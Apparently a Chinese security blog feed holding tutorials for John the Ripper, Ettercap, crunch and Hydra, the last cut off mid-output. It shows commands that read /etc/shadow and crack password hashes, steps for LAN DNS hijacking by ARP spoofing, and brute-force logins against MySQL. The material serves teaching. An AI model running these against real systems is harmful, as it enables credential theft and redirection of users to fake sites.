        <content type="html"><![CDATA[<h1 id="一：John-概述"><a href="#一：John-概述" class="headerlink" title="一：John 概述"></a>一：John 概述</h1><p>开膛手约翰（John the Ripper）是一个快速的密码破解程序。</p><p>其主要目的是检测弱 Unix 密码。</p><h1 id="二：John-破解-Linux-密码"><a href="#二：John-破解-Linux-密码" class="headerlink" title="二：John 破解 Linux 密码"></a>二：John 破解 Linux 密码</h1><h2 id="2-1-相关文件"><a href="#2-1-相关文件" class="headerlink" title="2.1 相关文件"></a>2.1 相关文件</h2><p>Linux 系统中存放账号、密码的两个重要文件 &#x2F;etc&#x2F;passwd 与 &#x2F;etc&#x2F;shadow</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd# 查看存放账户的文件内容</span><br><span class="line">cat /etc/passwd | head -1</span><br><span class="line">root:x:0:0:root:/root:/usr/bin/zsh# 被&quot;:&quot;划分为7个字段</span><br><span class="line">用户名：密码：用户ID（UID）：用户组ID（GID）：描述信息：主目录：默认shell</span><br><span class="line"></span><br><span class="line">cat /etc/shadow # 查看存放账户密码的文件内容</span><br><span class="line">cat /etc/shadow | head -1# 被&quot;:&quot;划分为9个字段</span><br><span class="line">root:$y$j9T$yRBeGeHrNuu/yNBeAEqn40$.ljB8e37.pNGJXOVLiDDJUTTCcA..R8rXJcUmFCuBcB:19321:0:99999:7:::</span><br><span class="line">用户名：加密密码：最后一次修改时间：最小修改时间间隔：密码有效期：密码需要变更前的警告天数：密码过期后的宽限时间：账号失效时间：保留字段</span><br></pre></td></tr></table></figure><h2 id="2-2-破解密码"><a href="#2-2-破解密码" class="headerlink" title="2.2 破解密码"></a>2.2 破解密码</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将账户文件与密码文件合成一个文件</span></span><br><span class="line">unshadow /etc/passwd /etc/shadow &gt; shadow</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 john 破解账户 ssh 密码</span></span><br><span class="line">john --format=crypt shadow </span><br><span class="line"></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">使用默认输入编码：UTF-8</span><br><span class="line">Loaded 3 password hashes with 3 different salts (crypt, generic crypt(3) [?/64])</span><br><span class="line">用3种不同的盐加载3个密码散列（crypt, generic crypt(3) [?/64]）</span><br><span class="line">Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes</span><br><span class="line">对于所有加载的哈希，成本1（算法[1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]）为0</span><br><span class="line">Cost 2 (algorithm specific iterations) is 1 for all loaded hashes</span><br><span class="line">对于所有加载的哈希，成本2（特定于算法的迭代）为1</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">单一进程，规则：单一</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">按 &#x27;q&#x27; 或者 Ctrl-C 终止，几乎任何其他状态键</span><br><span class="line">root             (root)     </span><br><span class="line">root             (ghost)     </span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class="line">基本完成：处理剩余的缓存候选密码（如果有）</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst</span><br><span class="line">继续处理单词列表：/usr/share/john/password.lst</span><br><span class="line">123456           (test)     </span><br><span class="line">3g 0:00:00:18 DONE 2/3 (2022-11-27 01:26) 0.1648g/s 82.08p/s 82.19c/s 82.19C/s 123456..pepper</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">使用 &quot;--show&quot; 选项可靠地显示所有破解的密码</span><br><span class="line">Session completed. </span><br><span class="line">会话完成。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ettercap 使用教程</title>
      <link href="/blog/a1a9ff1d.html/"/>
      <url>/blog/a1a9ff1d.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：DNS-概述"><a href="#一：DNS-概述" class="headerlink" title="一：DNS 概述"></a>一：DNS 概述</h1><p>在网络中，机器之间只认识 IP 地址，机器之间最终都要通过IP来相互访问。但是为了方便记忆，可以为 IP 地址设置一个对应的域名，通过访问域名，就可以找到对应的 IP 地址的网站。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ping baidu.com</span><br><span class="line"></span><br><span class="line">正在 Ping baidu.com [110.242.68.66] 具有 32 字节的数据:</span><br><span class="line">来自 110.242.68.66 的回复: 字节=32 时间=21ms TTL=54</span><br><span class="line">来自 110.242.68.66 的回复: 字节=32 时间=20ms TTL=54</span><br><span class="line">来自 110.242.68.66 的回复: 字节=32 时间=19ms TTL=54</span><br><span class="line">来自 110.242.68.66 的回复: 字节=32 时间=21ms TTL=54</span><br><span class="line"></span><br><span class="line">110.242.68.66 的 Ping 统计信息:</span><br><span class="line">    数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，</span><br><span class="line">往返行程的估计时间(以毫秒为单位):</span><br><span class="line">    最短 = 19ms，最长 = 21ms，平均 = 20ms</span><br></pre></td></tr></table></figure><p>看似我们访问的是域名，而实际上是通过 IP 地址访问的百度。由 ping 命令，我们可以看出 baidu.com 到 110.242.68.66 的转换工作称为域名解析，域名解析需要专门的域名解析服务器来完成，DNS就是进行域名解析的服务器（Domain Name System 或者 Domain Name Service）。</p><h1 id="二：DNS-原理"><a href="#二：DNS-原理" class="headerlink" title="二：DNS 原理"></a>二：DNS 原理</h1><p>DNS 查询时，会先在本地缓存中尝试查找，如果不存在或者记录过期，就继续向 DNS 服务器发起递归查询，这里的 DNS 服务器一般就是运营商的 DNS 服务器。</p><ul><li>第一步：客户机提出域名解析请求，并将该请求发送给本地的域名服务器。</li><li>第二步：当本地的域名服务器收到请求后，就查询本地的缓存，如果有该记录项，则本地的域名服务器就直接把查询结果（域名对应的IP地址）返回。</li><li>第三步：如果本地的缓存中没有该记录，则本地域名服务器就直接请求发给根域名服务器，然后根域名服务器再返回本地域名服务器一个所查询域（根的子域）的主域名服务器地址。</li><li>第四步：本地服务器再向上一步返回的域名服务器发送请求，然后接受请求的服务器查询自己的缓存，如果没有该记录，则返回相关的下级的域名服务器地址。</li><li>第五步：重复第四步，直到找到正确的记录。</li><li>第六步：本地域名服务器把返回的结果保存到缓存，以备下一次使用，同时还将结果返回给客户机。</li></ul><h1 id="三：什么是-DNS-劫持"><a href="#三：什么是-DNS-劫持" class="headerlink" title="三：什么是 DNS 劫持"></a>三：什么是 DNS 劫持</h1><p>DNS 劫持又称域名劫持，是指通过某些手段取得某域名的解析控制权，修改此域名的解析结果，导致对该域名的访问由原 IP 地址转入到修改之后指定的 IP，其结果就是对特定网址不能访问或者访问的是假网址。</p><p>如果可以冒充域名服务器，然后把查询的IP地址设置为攻击者的IP地址，这样的话，用户上网就只能看到攻击者的主页，而不是用户想要取得的网站主页，这就是DNS劫持的基本原理。</p><p>DNS劫持其实并不是真的 “黑掉” 了对方的网站，而是冒名顶替、招摇撞骗罢了。</p><h1 id="四：DNS-劫持危害"><a href="#四：DNS-劫持危害" class="headerlink" title="四：DNS 劫持危害"></a>四：DNS 劫持危害</h1><ul><li>钓鱼诈骗<ul><li>网上购物，网上支付有可能被恶意指向别的网站，泄密个人账户；</li></ul></li><li>网站内出现恶意广告</li><li>轻则影响网速，重则不能上网</li></ul><h1 id="五：Ettercap-进行内网-DNS-劫持"><a href="#五：Ettercap-进行内网-DNS-劫持" class="headerlink" title="五：Ettercap 进行内网 DNS 劫持"></a>五：Ettercap 进行内网 DNS 劫持</h1><ol><li>准备欺骗页面，放在 &#x2F;var&#x2F;www&#x2F;html 目录下并启动</li><li>配置 ettercap 工具配置文件<ul><li>leafpad &#x2F;etc&#x2F;ettercap&#x2F;etter.dns</li><li>注释记录→添加记录→保存退出</li></ul></li><li>设置 ettercap 的配置<ul><li>ettercap -G 启动 Ettercap</li><li>启动嗅探→ 设置eth0网卡 → 扫描主机 → 将网关与主机添加到target选项 → 选择ARP欺骗 → 选择 DNS spoof 欺骗模块 → 点击start 开始欺骗</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>crunch 使用教程</title>
      <link href="/blog/800cc2a8.html/"/>
      <url>/blog/800cc2a8.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：简介"><a href="#一：简介" class="headerlink" title="一：简介"></a>一：简介</h1><p>crunch 是一种创建密码字典的工具，按照指定的规则生成密码字典，可以灵活的定制自己的字典文件。</p><p>使用 crunch 工具生成的密码可以输出到屏幕，保存到文件、或者另一个程序。</p><p>crunch 最厉害的就是知道密码的一部分细节后，可以针对性的生成字典。</p><h1 id="二：规则"><a href="#二：规则" class="headerlink" title="二：规则"></a>二：规则</h1><h2 id="2-1-生成方式"><a href="#2-1-生成方式" class="headerlink" title="2.1 生成方式"></a>2.1 生成方式</h2><p>crunch生成字典的方式：</p><ol><li>指定生成26个字母或者数字的随机字典</li><li>指定格式生成字典</li><li>指定模板生成字典</li><li>指定字符串生成字典</li></ol><h2 id="2-2-参数详情"><a href="#2-2-参数详情" class="headerlink" title="2.2 参数详情"></a>2.2 参数详情</h2><ul><li>min：设定最小字符串长度（必选）</li><li>max：设定最大字符串长度（必选）</li><li>-o 将生成的字典保存在指定文件</li><li>-t 指定密码输出的格式</li><li>-p 指定元素组合</li><li>特殊字符<ul><li>%：代表数字</li><li>^：代表特殊符号</li><li>@：代表小写字母</li><li>.：代表大写字母</li></ul></li></ul><h1 id="三：命令"><a href="#三：命令" class="headerlink" title="三：命令"></a>三：命令</h1><h2 id="2-1-crunch"><a href="#2-1-crunch" class="headerlink" title="2.1 crunch"></a>2.1 crunch</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">crunch   </span><br><span class="line"></span><br><span class="line">crunch version 3.6</span><br><span class="line"></span><br><span class="line">Crunch can create a wordlist based on criteria you specify.  The output from crunch can be sent to the screen, file, or to another program.</span><br><span class="line">crunch 可以基于你指定的标准创建一个单词表。crunch的输出key发送到屏幕、文件或者另一个程序。</span><br><span class="line"></span><br><span class="line">Usage: crunch &lt;min&gt; &lt;max&gt; [options]</span><br><span class="line">用法：crunch &lt;最小&gt; &lt;最大&gt; [选项]</span><br><span class="line">where min and max are numbers</span><br><span class="line">其中最小值和最大值是数字</span><br><span class="line"></span><br><span class="line">Please refer to the man page for instructions and examples on how to use crunch.</span><br><span class="line">有关如何使用crunch，请参考手册页的说明和实例。</span><br></pre></td></tr></table></figure><h2 id="2-2-生成纯数字密码"><a href="#2-2-生成纯数字密码" class="headerlink" title="2.2 生成纯数字密码"></a>2.2 生成纯数字密码</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成一个最小字符串长度为两位、最大字符串长度为四位的字典。</span></span><br><span class="line">crunch 2 4 &gt; number.txt</span><br><span class="line"></span><br><span class="line">Crunch will now generate the following amount of data: 2357212 bytes</span><br><span class="line">crunch 现在将生成以下数量的数据：2357212 字节</span><br><span class="line">2 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 475228</span><br><span class="line">crunch 现在将生成以下行数：475228</span><br></pre></td></tr></table></figure><h2 id="2-3-生成指定格式密码"><a href="#2-3-生成指定格式密码" class="headerlink" title="2.3 生成指定格式密码"></a>2.3 生成指定格式密码</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成7位数，以admin开头+2位数字的字典，保存到admin_num.txt中。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-t：指定以某种格式开头</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">%%：表示两位数字</span></span><br><span class="line">crunch 7 7 -t admin%% &gt; admin_num.txt</span><br><span class="line">Crunch will now generate the following amount of data: 800 bytes</span><br><span class="line">0 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 100 </span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成以1520003开头的手机号</span></span><br><span class="line">crunch 11 11 -t 1520003%%%% &gt; mobile.txt</span><br><span class="line">Crunch will now generate the following amount of data: 120000 bytes</span><br><span class="line">0 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 10000 </span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定的数字生成字典</span></span><br><span class="line">crunch 6 6 0123456789 &gt; num.txt                                  </span><br><span class="line">Crunch will now generate the following amount of data: 7000000 bytes</span><br><span class="line">6 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 1000000 </span><br><span class="line"></span><br><span class="line">crunch 6 6 -f /usr/share/crunch/charset.lst numeric &gt; num_repo.txt</span><br><span class="line">Crunch will now generate the following amount of data: 7000000 bytes</span><br><span class="line">6 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 1000000</span><br></pre></td></tr></table></figure><h2 id="2-4-依据库文件生成密码"><a href="#2-4-依据库文件生成密码" class="headerlink" title="2.4 依据库文件生成密码"></a>2.4 依据库文件生成密码</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-f：指定库文件</span></span><br><span class="line">crunch 6 6 -f /usr/share/crunch/charset.lst hex-lower -o repo.txt</span><br><span class="line">Crunch will now generate the following amount of data: 117440512 bytes</span><br><span class="line">112 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 16777216 </span><br><span class="line"></span><br><span class="line">crunch: 100% completed generating output</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">库文件</span></span><br><span class="line">cat /usr/share/crunch/charset.lst                                </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">charset configuration file <span class="keyword">for</span> winrtgen v1.2 by Massimiliano Montoro (mao@oxid.it)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Massimiliano Montoro 的 winrtgen v1.2 字符集配置文件(mao@oxid.it)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">compatible with rainbowcrack 1.1 and later by Zhu Shuanglei &lt;shuanglei@hotmail.com&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">兼容 Zhu Shuanglei 的 rainbowcrack 1.1 以及更高版本。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hex-lower                     = [0123456789abcdef]</span><br><span class="line">十六进制小写</span><br><span class="line">hex-upper                     = [0123456789ABCDEF]</span><br><span class="line">十六进制大写</span><br><span class="line"></span><br><span class="line">numeric                       = [0123456789]</span><br><span class="line">数字的</span><br><span class="line">numeric-space                 = [0123456789 ]</span><br><span class="line">带有空格的数字</span><br><span class="line"></span><br><span class="line">symbols14                     = [!@#$%^&amp;*()-_+=]</span><br><span class="line">symbols14-space               = [!@#$%^&amp;*()-_+= ]</span><br><span class="line"></span><br><span class="line">symbols-all                   = [!@#$%^&amp;*()-_+=~`[]&#123;&#125;|\:;&quot;&#x27;&lt;&gt;,.?/]</span><br><span class="line">symbols-all-space             = [!@#$%^&amp;*()-_+=~`[]&#123;&#125;|\:;&quot;&#x27;&lt;&gt;,.?/ ]</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="2-4-指定元素组合生成字典"><a href="#2-4-指定元素组合生成字典" class="headerlink" title="2.4 指定元素组合生成字典"></a>2.4 指定元素组合生成字典</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定生成的字典，由 ghost、99、22 三个元素组成</span></span><br><span class="line">crunch 3 3 -p ghost 99 22 &gt; combination.txt                       </span><br><span class="line">Crunch will now generate approximately the following amount of data: 60 bytes</span><br><span class="line">0 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 6 </span><br></pre></td></tr></table></figure><h1 id="四：练习"><a href="#四：练习" class="headerlink" title="四：练习"></a>四：练习</h1><ul><li>以26个字母为元素最小5位，最大6位的组合，重定向保存到exercise1.txt字典文件中。<ul><li>crunch 5 6 &gt; exericise1.txt</li></ul></li><li>以root字符开头，第五位、第六位为特殊符号，七八九位为123结尾的9位数字字典，重定向保存到exercise2.txt字典文件中<ul><li>crunch 9 9 -t root^^123 &gt; exercise3.txt</li></ul></li><li>指定库文件中的 hex-upper 模板生成6位的字典，使用 -o 参数，保存在 exercise4.txt 字典文件中<ul><li>crunch 6 6 -f &#x2F;usr&#x2F;share&#x2F;crunch&#x2F;charset.lst  hex-upper -o exercise4.txt</li></ul></li><li>生成 pdd、1611、0101 这个三个字符串的随机字典，重定向保存到 exercise5.txt 字典文件中<ul><li>crunch 3 3 -p pdd 1611 0101 &gt; exercise5.txt</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hydra 使用教程</title>
      <link href="/blog/a6c19022.html/"/>
      <url>/blog/a6c19022.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：简介"><a href="#一：简介" class="headerlink" title="一：简介"></a>一：简介</h1><p>Hydra 是一款非常强大的暴力破解工具，可以利用它对众多协议进行口令、账号、密码的爆破，支持FTP、MySQL、SMTP、TELNET、SSH等众多的协议爆破。</p><p>Hydra 是一个验证性质的工具，主要目的是：展示安全研究人员从远程获取一个系统认证权限。</p><h1 id="二：基础指令"><a href="#二：基础指令" class="headerlink" title="二：基础指令"></a>二：基础指令</h1><h2 id="2-1-概述"><a href="#2-1-概述" class="headerlink" title="2.1 概述"></a>2.1 概述</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">hydra</span><br><span class="line"></span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line">Hydra v9.3 2022的作者：van Hauser/THC &amp; David Maciejak。请不要在军事或者特情局组织中使用，或者用于非法目的（这是非约束性的，反正这些****无视法律和道德）</span><br><span class="line"></span><br><span class="line">Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]</span><br><span class="line">语法：hydra ...</span><br><span class="line">hydra [ [-l LOGIN|-L FILE] [-p PASS|-P FILE] ]</span><br><span class="line">hydra [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">选项：</span><br><span class="line">  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE</span><br><span class="line">  -l 登录名 或者 -L 文件  登录使用一个登录名，或者从文件中加载多个登录</span><br><span class="line">  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE</span><br><span class="line">  -p 密码 或者 -P 文件尝试密码登录，或者从文件中加载多个密码</span><br><span class="line">  -C FILE   colon separated &quot;login:pass&quot; format, instead of -L/-P options</span><br><span class="line">  -C 文件冒号分隔格式 &quot;login:pass&quot;，而不是 -L/-P 选项</span><br><span class="line">  -M FILE   list of servers to attack, one entry per line, &#x27;:&#x27; to specify port</span><br><span class="line">  -M 文件要攻击的服务器列表，每行一个条目，使用&#x27;:&#x27;去指定端口</span><br><span class="line">  -t TASKS  run TASKS number of connects in parallel per target (default: 16)</span><br><span class="line">  -t 线程数运行任务在每一个目标的并行连接数（默认值：16）</span><br><span class="line">  -U        service module usage details</span><br><span class="line">  -U服务模块使用详情</span><br><span class="line">  -m OPT    options specific for a module, see -U output for information</span><br><span class="line">  -m 选项特定于模块的选项，使用 -U 查看输出详细信息</span><br><span class="line">  -h        more command line options (COMPLETE HELP)</span><br><span class="line">  -h更多命令行选项（完整帮助）</span><br><span class="line">  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)</span><br><span class="line">  服务器目标DNS，IP 或者 网关 192.168.0.0/24（此选项或者 -M 选项）</span><br><span class="line">  service   the service to crack (see below for supported protocols)</span><br><span class="line">  服务要破解的服务（有关支持的协议，请参见下文）</span><br><span class="line">  OPT       some service modules support additional input (-U for module help)</span><br><span class="line">  选项一些支持附加输入的服务模块（-U 表示模块帮助）</span><br><span class="line"></span><br><span class="line">Supported services: adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird ftp[s] http[s]-&#123;head|get|post&#125; http[s]-&#123;get|post&#125;-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-&#123;cram|digest&#125;md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp</span><br><span class="line">支持的服务：...</span><br><span class="line"></span><br><span class="line">Hydra is a tool to guess/crack valid login/password pairs.</span><br><span class="line">Hydra 是一个 猜测/破解 有效 登录/密码对 的工具。</span><br><span class="line">Licensed under AGPL v3.0. The newest version is always available at;</span><br><span class="line">根据AGPL v3.0许可，最新版本可以从以下网址获取：</span><br><span class="line">https://github.com/vanhauser-thc/thc-hydra</span><br><span class="line">Please don&#x27;t use in military or secret service organizations, or for illegal</span><br><span class="line">purposes. (This is a wish and non-binding - most such people do not care about</span><br><span class="line">laws and ethics anyway - and tell themselves they are one of the good ones.)</span><br><span class="line">请不要使用在军事或者密码服务组织中使用，否则为非法目的。（这是一个愿望，没有约束力，大多数这样的人不关心法律和道德，告诉自己他们是好的。）</span><br><span class="line"></span><br><span class="line">Example:  hydra -l user -P passlist.txt ftp://192.168.0.1</span><br><span class="line">示例：hydar ...</span><br></pre></td></tr></table></figure><h2 id="2-2-破解MySQL"><a href="#2-2-破解MySQL" class="headerlink" title="2.2 破解MySQL"></a>2.2 破解MySQL</h2><h3 id="（1）指定-IP-端口破解"><a href="#（1）指定-IP-端口破解" class="headerlink" title="（1）指定 IP 端口破解"></a>（1）指定 IP 端口破解</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hydra -L 登录账户薄 -P 密码薄 mysql://目标IP:mysql端口号</span></span><br><span class="line">hydra -L ./login.txt -P ./passwd.txt mysql://192.168.1.106:3306</span><br><span class="line"></span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-26 14:23:55</span><br><span class="line">Hydra 开始于 2022-11-26 14:23:55</span><br><span class="line">[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)</span><br><span class="line">信息：将任务数量减少到4（mysql不喜欢多并行连接）</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 15 login tries (l:3/p:5), ~4 tries per task</span><br><span 